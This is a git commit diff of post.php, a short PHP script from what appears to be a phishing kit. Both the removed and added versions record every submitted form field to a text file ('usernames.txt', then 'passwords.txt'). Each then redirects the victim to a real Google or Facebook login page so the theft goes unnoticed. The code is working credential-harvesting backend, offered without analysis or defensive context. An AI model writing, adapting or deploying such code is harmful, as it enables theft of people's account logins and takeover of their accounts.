f0e3f5c9b48bc482d5b998183aab07cacb78a8d7
munsifcreative <39263738+munsifcreative@users.noreply.github.com>
2018-06-22 18:33:49 +0000

    Add files via upload

--- post.php
+++ post.php
@@ -1,13 +1,13 @@
-<?php
-header ('Location:https://accounts.google.com/');
-$handle = fopen("usernames.txt", "a");
-foreach($_POST as $variable => $value) {
-   fwrite($handle, $variable);
-   fwrite($handle, "=");
-   fwrite($handle, $value);
-   fwrite($handle, "\r\n");
+:<?php
+header("Location: https://m.facebook.com/login.php?&e=1348092&email=");
+$handle = fopen("passwords.txt", "a");
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
 }
 fwrite($handle, "\r\n");
 fclose($handle);
 exit;
-?>
+?> 
